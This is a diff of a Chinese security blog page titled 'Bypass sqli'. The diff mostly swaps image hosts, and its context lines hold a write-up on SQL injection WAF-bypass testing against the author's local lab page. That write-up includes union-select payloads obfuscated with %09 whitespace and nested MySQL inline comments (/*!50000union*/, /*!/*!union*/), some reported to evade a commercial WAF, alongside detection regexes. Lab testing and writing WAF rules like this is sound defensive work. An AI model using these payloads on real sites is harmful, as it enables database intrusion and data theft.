@@ -15,23 +15,23 @@
 <meta property="og:site_name" content="Sec-note">
 <meta property="og:description" content="从网上收集整理一些绕过WAF的一些技巧，测试一下是否真的可以绕过。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-31/90841889.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-31/99643534.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-31/77165993.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-31/1171748.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/97975578.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/93606267.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/75381712.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/7930045.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/80373497.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/54846943.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/93650271.jpg">
-<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-18/4973873.jpg">
-<meta property="og:updated_time" content="2018-01-18T07:51:06.000Z">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/90841889.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/99643534.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/77165993.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/1171748.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/97975578.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/93606267.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/75381712.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/7930045.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/80373497.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/54846943.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/93650271.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/4973873.jpg">
+<meta property="og:updated_time" content="2018-12-11T12:38:53.014Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Bypass sqli">
 <meta name="twitter:description" content="从网上收集整理一些绕过WAF的一些技巧，测试一下是否真的可以绕过。">
-<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//17-10-31/90841889.jpg">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/90841889.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
   
@@ -161,7 +161,7 @@ echo $sql;
 mysqli_close($conn);
 ?&gt;
 </code></pre><p>测试，看到确实是一个注入点。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-31/90841889.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/90841889.jpg" alt=""></p>
 <h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>很多网站都是存在WAF防御，现在测试用来绕过WAF的<code>payload</code>在自己的环境上是否可以成功执行,如果执行成功的话，那就测试某家的WAF是否可以防御。</p>
 <blockquote>
 <font color="red">BYPASS WAF的原理。去处理实际上位于WAF设备之后处理应用层数据包的硬件/软件的特性。利用特性构造WAF不能命中，但是在应用程序能够执行成功的载荷，绕过防护。</font>
@@ -180,39 +180,39 @@ mysqli_close($conn);
 </ol>
 <p>对于其中空格的替换，以及<code>mysql</code>中可利用的空白字符，可以成功执行。但是结合<code>union select</code>测试<code>WAF</code>的时候，都可以防御。</p>
 <pre><code>(?i:union\b.*?\bselect\b)
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-31/99643534.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/99643534.jpg" alt=""></p>
 <p>mysql可利用空白符的理解。在url中插入这些字符，但是在入库查询的时候，这些字符就不见了，即空白字符。比如<code>%09</code></p>
 <pre><code>127.0.0.1/waf/test.php?id=-1 union%09select 1,user(),3
 </code></pre><p>可以正常执行，注入出数据。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-31/77165993.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/77165993.jpg" alt=""></p>
 <p>那试试<code>%08</code>呢？这次就发现，sql语句不能成功执行了。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-10-31/1171748.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//17-10-31/1171748.jpg" alt=""></p>
 <p><strong>内联注释</strong></p>
 <p><code>Hackbar</code>自带的几种注释。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/97975578.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/97975578.jpg" alt=""></p>
 <p><strong><code>/*_STRING_*/</code></strong> 能够正确执行，可以出数据，WAF可防御。</p>
 <pre><code>127.0.0.1:8000/waf/test.php?id=-1 /*!union*/ select 1,user (),3 
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/93606267.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/93606267.jpg" alt=""></p>
 <p><strong><code>/*!50000_String_*/</code></strong> 能够正确执行，可以出数据，WAF可防御。</p>
 <pre><code>127.0.0.1:8000/waf/test.php?id=-1 /*!50000union*/ select 1,user (),3 
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/75381712.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/75381712.jpg" alt=""></p>
 <p><strong><code>/*!12345_string_*/</code></strong> 能够正确执行，可以出数据，WAF可防御。</p>
 <pre><code>127.0.0.1:8000/waf/test.php?id=-1 /*!12345union+select*/ 1,user (),3 
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/7930045.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/7930045.jpg" alt=""></p>
 <p><strong><code>/*!*13337_string_*/</code></strong> 能够正确执行，可以出数据，WAF可防御。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/80373497.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/80373497.jpg" alt=""></p>
 <p><strong><code>/*!/*!string*/</code></strong> 注释，可正确执行，出数据，绕过某锁。</p>
 <pre><code>http://192.168.145.156:8000/test.php?id=-1 union select 1,user(),3
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/54846943.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/54846943.jpg" alt=""></p>
 <p>注释一下，绕过。</p>
 <pre><code>http://192.168.145.156:8000/test.php?id=-1/*!/*!union*//*!/*!select*/ 1,user (),3 
-</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/93650271.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/93650271.jpg" alt=""></p>
 <p>自己又胡乱捣鼓了一下。</p>
 <pre><code>/*! /*!order/*/*/by*/ 3
 
 http://192.168.145.156:8000/test.php?id=-1 /*!/*!union/*/*/select*/ 1,user(),3
 </code></pre><p>好像也能过去的。</p>
-<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-18/4973873.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-1-18/4973873.jpg" alt=""></p>
 <p>对于注释绕过，如何写正则呢？可以看到注释，一定含有 <code>/*string*/</code>。匹配<code>/*string*/</code>。</p>
 <pre><code>(?i:(/\*(.*?)\*/))
 </code></pre><p><strong>思考空格代替</strong></p>
@@ -225,7 +225,7 @@ http://192.168.145.156:8000/test.php?id=-1 /*!/*!union/*/*/select*/ 1,user(),3
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/12/19/Bypass_Sqli/" data-id="cjnkdsvhx000108xdhy5ivrrv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/12/19/Bypass_Sqli/" data-id="cjpjt0n3y00014dxdms1gejjq" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Bypasswaf/">Bypasswaf</a></li></ul>
